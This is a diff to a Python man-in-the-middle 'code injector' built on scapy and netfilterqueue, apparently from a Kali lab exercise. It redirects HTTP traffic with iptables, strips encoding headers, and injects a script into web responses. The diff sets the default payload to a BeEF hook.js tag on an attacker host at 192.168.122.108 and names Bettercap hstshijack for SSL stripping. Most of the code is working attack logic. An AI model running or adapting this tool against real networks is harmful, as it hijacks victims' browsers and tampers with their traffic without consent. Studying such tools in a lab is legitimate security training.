@@ -1,10 +1,11 @@
-import argparse             # https://docs.python.org/3/library/argparse.html
-import netfilterqueue       # https://github.com/oremanj/python-netfilterqueue
-import os                   # https://docs.python.org/3/library/os.html
-import re                   # https://docs.python.org/3/library/re.html
-import scapy.all as scapy   # https://scapy.readthedocs.io/en/latest/index.html
-import subprocess           # https://docs.python.org/3/library/subprocess.html
-import sys                  # https://docs.python.org/3/library/sys.html
+import argparse  # https://docs.python.org/3/library/argparse.html
+import netfilterqueue  # https://github.com/oremanj/python-netfilterqueue
+import os  # https://docs.python.org/3/library/os.html
+import re  # https://docs.python.org/3/library/re.html
+import scapy.all as scapy  # https://scapy.readthedocs.io/en/latest/index.html
+import subprocess  # https://docs.python.org/3/library/subprocess.html
+import sys  # https://docs.python.org/3/library/sys.html
+import textwrap  # https://docs.python.org/3/library/textwrap.html
 
 
 def is_not_root():
@@ -12,26 +13,25 @@ def is_not_root():
 
 
 def get_args():
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(
+        description="Code injector tool (use Bettercap hstshijack/hstshijack for sslstripping)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """Example: 
+            code_injector.py # via a html file in location apache2 server on Kali, hook browser for BeEF, sslstrip on
+        """
+        ),
+    )
     parser.add_argument(
-        "-d",
-        "--destination",
-        dest="destination",
-        help="Destination (sslstrip, forward, local)",
+        "-d", "--destination", default="sslstrip", help="sslstrip, forward, or local"
     )
     parser.add_argument(
         "-c",
         "--code",
-        dest="code",
+        default='<script src="http://192.168.122.108:3000/hook.js"></script>',
         help="Code to inject",
     )
     values = parser.parse_args()
-    if not values.destination:
-        parser.error(
-            "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
-        )
-        if not values.code:
-            parser.error("[-] Give code to inject, use --help for more information")
     return values
 
 
@@ -63,7 +63,7 @@ def run_queue(destination, qnum):
         )
         subprocess.call(
             "sudo iptables -t nat -A PREROUTING -p tcp"
-            " --destination-port 80 -j REDIRECT --to-port 10000",
+            " --destination-port 80 -j REDIRECT --to-port 8080",
             shell=True,
         )
     elif destination == "local":
@@ -110,17 +110,13 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         load = scapy_packet[scapy.Raw].load
 
-        if (
-            scapy_packet[scapy.TCP].dport == 80
-            or scapy_packet[scapy.TCP].dport == 10000
-        ):
+        if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 8080:
             print("[+] Request")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
             load = load.replace("HTTP/1.1", "HTTP/1.0")
 
         elif (
-            scapy_packet[scapy.TCP].sport == 80
-            or scapy_packet[scapy.TCP].sport == 10000
+            scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 8080
         ):
             print("[+] Response")
             print("[+] Injection")
@@ -145,7 +141,7 @@ if is_not_root():
 options = get_args()
 try:
     apache_start()
-    run_queue(options.destination, 0)
+    run_queue(options.destination, 3)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL+C ... ")
     restore()
